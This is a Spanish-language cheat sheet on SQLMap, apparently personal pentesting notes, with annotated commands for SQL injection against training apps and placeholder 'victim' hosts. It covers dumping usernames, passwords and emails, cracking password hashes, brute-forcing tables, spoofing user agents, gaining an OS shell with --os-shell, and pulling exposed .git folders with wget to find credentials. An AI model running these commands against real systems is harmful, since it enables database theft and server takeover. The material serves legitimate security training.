# SQLMap 

Tags: #Tool #Web #Enumeracion #BurpSuite #SQLI #Git #SQLMap 

**SQLMap** es una herramienta de pruebas de penetración de código abierto que se utiliza para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web. Esta herramienta se basa en un motor de inyección SQL altamente automatizado que puede detectar y explotar una amplia variedad de vulnerabilidades de inyección SQL en diferentes sistemas de gestión de bases de datos.

SQLMap se utiliza para probar la seguridad de aplicaciones web que utilizan bases de datos, identificando y aprovechando vulnerabilidades de inyección SQL. Para hacer esto, SQLMap realiza una exploración automatizada de la aplicación web, identifica las vulnerabilidades de inyección SQL y explota estas vulnerabilidades para extraer información de la base de datos. La información extraída puede incluir nombres de usuario, contraseñas y otra información confidencial que podría ser utilizada por un atacante malintencionado para comprometer la seguridad de la aplicación.

Al utilizar SQLMap, los profesionales de seguridad pueden identificar y corregir las vulnerabilidades de inyección SQL en sus aplicaciones web, lo que mejora significativamente la seguridad de estas aplicaciones. También pueden utilizar SQLMap para realizar pruebas de penetración en aplicaciones web de terceros y así evaluar su nivel de seguridad. En general, SQLMap es una herramienta valiosa para cualquier profesional de la seguridad que trabaja en pruebas de penetración de aplicaciones web y en la detección de vulnerabilidades de inyección SQL.

## SQLMap

```bash 
❯ sqlmap --update     # Actualizar la herramienta 
❯ sqlmap --version    # Miramos la version 
❯ sqlmap -h           # Miramos la ayuda 
❯ sqlmap -hh          # Todas las opciones de ayuda 
```

## Comandos básicos y método GET

```bash 
# La URL es donde se encuentra la inyeccion SQL

❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&user-php-submit-button=View" --dbs 

	# u = Parametro URL
	# dbs = Extraer la base de datos existentes 

# Si nos pregunta 'Basic UNION Tests' podemos darle 'YES'
# Si nos pregunta 'Specific for other DBMSes' es recomendable 'NO' ya que no queremos probar con mas DBs 
# Si pregunta 'Include all tests for Postgre or MySQL' podemos darle 'YES'
# Si encuentra un parametro vulnerable y nos pregunta si queremos testear otros parametros podremos darle 'NO'
```

```bash 
❯ ls -la # En Linux podemos ver la carpeta oculta de SQLMap llamada '.sqlmap' la cual contiene el 'historial' y 'output'
```

```bash 
❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&user-php-submit-button=View" --dbs --dbms MySQL -p username --purge 

	# u = Parametro URL
	# dbs = Extraer la base de datos existentes
	# p = Especificar el parametro que es explotable 
	# dbms = Especifica el gestor de DB a utilizar 
	# purge = Borrara la carpeta donde se almacena el dominio utilizado en el 'output'
```

```bash 
❯ sqlmap --wizard    # Provee varios menus de acompañamiento durante la ejecucion del ataque
```

```bash 
❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&user-php-submit-button=View" --dbs --random-agent --purge    

	# random-agente = Genera un 'User Agent' diferente al momento de hacer el ataque

❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&user-php-submit-button=View" --dbs --user-agent="Opera/9.20 (Windows NT 5.1; U; it)" --purge

	# user-agent = Agregas la cabecera del 'User-Agent' personalizada
```

```bash 
❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&user-php-submit-button=View" --dbs --purge --mobile 

	# mobile = Escoger una cabecera 'User-Agent' de una app movil como: 'Apple, Google Nexus, Huawei, etc...'
```

## Tipos de inyecciones y método GET

```bash 
# Error Based 
# Enviar una consulta a la DB y nos mostrara los errores de la app

❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent --technique E -p password

	# technique = Especificamos la tecnica a utlizar 
		# B = Boolean Based Blind
		# E = Error Based
		# U = Union 
		# T = Time Based Blind 
	# p = Especificamos el parametro a utilizar
```

```bash 
# Union 
# Enviar una consulta a la DB uniendo los resultados de instrucciones SELECT en una sola peticion

❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent --technique U -p password

	# technique = Especificamos la tecnica a utlizar 
		# B = Boolean Based Blind
		# E = Error Based
		# U = Union 
		# T = Time Based Blind 
	# p = Especificamos el parametro a utilizar
```

## Tipos de inyecciones y método POST

```bash 
# Boolean Based Blind 
# Enviar una consulta a la DB para que nos devuelva un resultado 'True or False'

❯ sqlmap -u "http://IP/index.php?page=login.php" --dbs --dbms MySQL --random-agent --data="username=omar&password=omar&login-php-submit-button=Login" --method POST --technique B -p username

	# data = Agregamos el cuerpo de la peticion POST que contiene datos como: 'username, password', estos datos los podemos obtener desde 'Burpsuite'
	# method = Especificacion del metodo a utilizar
	# technique = Especificamos la tecnica a utlizar 
		# B = Boolean Based Blind
		# E = Error Based
		# U = Union 
		# T = Time Based Blind 
	# p = Especificamos el parametro a utilizar
```

```bash 
# Boolean Based Blind 
# Enviar una consulta a la DB, el tiempo de espera ayuda a determinar si el resultado es 'True or False'

❯ sqlmap -u "http://IP/index.php?page=login.php" --dbs --dbms MySQL --random-agent --data="username=omar&password=omar&login-php-submit-button=Login" --method POST --technique T -p username --time-sec 10

	# data = Agregamos el cuerpo de la peticion POST que contiene datos como: 'username, password', estos datos los podemos obtener desde 'Burpsuite'
	# method = Especificacion del metodo a utilizar
	# technique = Especificamos la tecnica a utlizar 
		# B = Boolean Based Blind
		# E = Error Based
		# U = Union 
		# T = Time Based Blind 
	# p = Especificamos el parametro a utilizar
	# time-sec = Le damos un tiempo maximo de espera a la apliacion ya que estaremos usando la tecnica 'Time Based Blind' y asi SQLMap no crea que la app dejo de funcionar 
```

## Detección 

```bash 
❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent --level 1 -v 5

	# level = Nivel de intensidad que van desde el 1 al 5 
		# 1 = Testear parametros 'GET o POST'
		# 2 = Explota vulnes en el 'User-Agent o Encabezado HTTP'
		# 3 = Explotar vulnes en las 'Cookies'
	# v = Verbosidad que van desde el 1 al 5
		# 1 = Ahi podemos ver 'Info, Alertas, Mensajes, Preguntas'
		# 5 = Toda la peticion que hace al servidor HTTP, ademas de sus datos y encabezados
```

```bash 
❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent --risk 3 -v 5

	# risk = Niveles de riesgo que van desde el 1 al 3
		# 1 = Testea los puntos de inyeccion SQL como los parametros 'Username, Password, etc...'
		# 2 = Hace inyeccciones de tiempo 
		# 3 = Hace inyecciones como 'Error Base, OR, Union'
```

## Enumeración 

```bash 
❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --fingerprint 
	# fingerprint = Es la encargada de la deteccion de la version de la DB

❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --banner
	# banner = Informacion de la DB, SO, Tecnologia, etc...

❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --current-db
	# current-db = Retorna la DB actual de trabajo en la app

❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --count
	# count = Obtiene la info de cada tabla en cada DB existente 

❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --schema
	# schema = Nos muestra la DB 'Information Schema' la cual contiene la configuracion logica de las DB existentes
```

```bash 
❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username --users --is-dba --current-user --roles
	
	# users = Muestra los usuarios en la DB
	# is-dba = Muestra 'True' si somos el usuario 'admin' de la DB 
	# current-user = Muestra el nombre del usuario actual
	# roles = Muestra el rol de cada usuario 
```

## Ejemplo 1 'Obteniendo el parámetro vulnerable en la URL'

```bash 
❯ sqlmap -u 'http://site.com/index.php?id=1'    # Necesitamos pasarle la URL en donde se encuentra el index.php con el parametro 'id' existente. 


Cuando mires en una maquina victima el directorio /.git/ quiere decir que se ha clonado un directorio Git y puede suponer un riesgo, porque si tiene la capacidad de 'directory listing'  nos podemos traer los archivos a la maquina de atacante. 


❯ wget -r http://192.168.68.11           # Nos descargarnos de forma recursiva el contenido del dir .git
❯ git log                                # Pueder ves los 'commits' y su descripcion de cada cambio 
❯ git show <id>                          # puedes ver el contenido de los commit y en algunos casos obtener el registro de credenciales 


❯ sqlmap -u 'http://<IP Victima>' --dbs --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch  # Debemos de colocar la url hasta el parametro que se usa para modificar e inyectar el SQL.
	# dbs = Haremos que nos enumere las bases de datos, pero antes debemos de estar autenticados 
	# cookie = "usuario=valor" Colocar la Cookie de Sesion de la web que se encuentra en (Inspector > Storage > Value) o en Burp
	# dbms = Para indicarle que la base de datos es Mysql y asi evitar algunas preguntas (Esto si conocemos que base de datos esta corriendo) 
	# batch = Indicar que no queremos que nos este preguntando y solo nos muestre los resultados obtenidos

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D <DB-name> --tables
	# D = Colocar el nombre de la DB que hemos encontrado 
	# tables = Enumerar las tablas de la DB

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D <DB-name> -T <Table-name> --columns
	# columns = Enumerar las columnas 
	# T = Nombre de la tabla 

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D <DB-name> -T <Table-name> -C <username,password,email> --dump
	# C = Colocas las columnas que quieres dumpear
	# dump = Mostrar el contenido de las columnas username, password y email

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D <DB-name> -T <Table-name> -C <username,password> --passwords
	# password = Enumera el usuario y su password

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --risk 3 --level 4   # Esto demora mas tiempo 
	# risk = Nivel de riesgo 
	# level = Nivel de profundidad

❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --os-shell --batch     # Si el servidor interpreta PHP, tenemos permisos, podriamos ganar una consola interactiva 
```

```bash 
❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbms mysql --batch -D dvwa --random-agent -p username --privileges 
	# privileges = Muestra los privilegios de un usuario en el gestor de la DB
```

```bash 
❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbms mysql --batch -D dvwa --random-agent -p username --search users
	# search = Busca en la DB info especifica relacionada a las tablas o columnas, en este cado 'users'
	# Opciones:
		# 1 = Busqueda relacionada a 'users' (Recomendado)
		# 2 = Busqueda exacta de 'users'

❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbms mysql --batch -D dvwa --random-agent -p username --hostname
	# hostname = Muestra el nombre del servidor que contiene la app vulnerable 
```

## Fuerza bruta 

```bash 
❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbms mysql --batch --random-agent -p username -D dvwa --common-tables 
	# common-tables = Ataque de fuerza bruta para buscar tablas con un diccionario 
	# Opciones:
		# 1 = Diccionario por defaul 
		# 2 = Diccionario custom y colocar el 'path'

❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbms mysql --batch --random-agent -p username -D dvwa -T accounts --common-columns
	# common-columns = Ataque de fuerza bruta para buscar columnas con un diccionario 
	# Opciones:
		# 1 = Diccionario por defaul 
		# 2 = Diccionario custom y colocar el 'path'
```

## Ejemplo 2  'Capturando la petición con Burpsuite'

```bash 
# Podemos usar la petición donde se encuentra la inyección capturada por BurpSuite e ingresarla en la herramienta SQLMap. Esto puede ser en un panel de 'login/passwd'

❯ sqlmap -r peticion.txt            # Obtenemos el archivo 'peticion.txt' copiando la intercepcion del Burpsuite 
```

```bash
❯ sqlmap -r example.req -p searchitem --dbs

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# dbs = Me muestre todas las bases de datos existentes (Dumpear)
```

```bash
# Una vez obtenidas las DBs se muestran las tablas 
❯ sqlmap -r example.req -p searchitem -D sqltraining --tables

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# D = Le colocamos el nombre de la DB existente 
	# tables = Queremos que nos muestre las tablas de la DB que elegimos 
```

```bash
# Una vez obtenidas las tablas se muestran las columnas 
❯ sqlmap -r example.req -p searchitem -D sqltraining -T users --columns

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# D = Le colocamos el nombre de la DB existente 
	# T = Le colocamos el nombre de la tabla existente 
	# columns = Queremos que nos muestre las columnas de la DB que elegimos 
```

```bash
# Una vez obtenidas las columnas se puede dumpear los valores 
❯ sqlmap -r example.req -p searchitem -D sqltraining -T users -C username,password --dump

	# r = File con el contenido del Proxy de BurpSuite .req
	# p = El campo donde queremos que pruebe 
	# batch = Para que no nos muestre las preguntas y las salte
	# D = Le colocamos el nombre de la DB existente 
	# T = Le colocamos el nombre de la tabla existente 
	# C = Le colocamos el nombre de las columnas existente 
	# dump = Que nos muestre los valores que tienen esas columnas
```



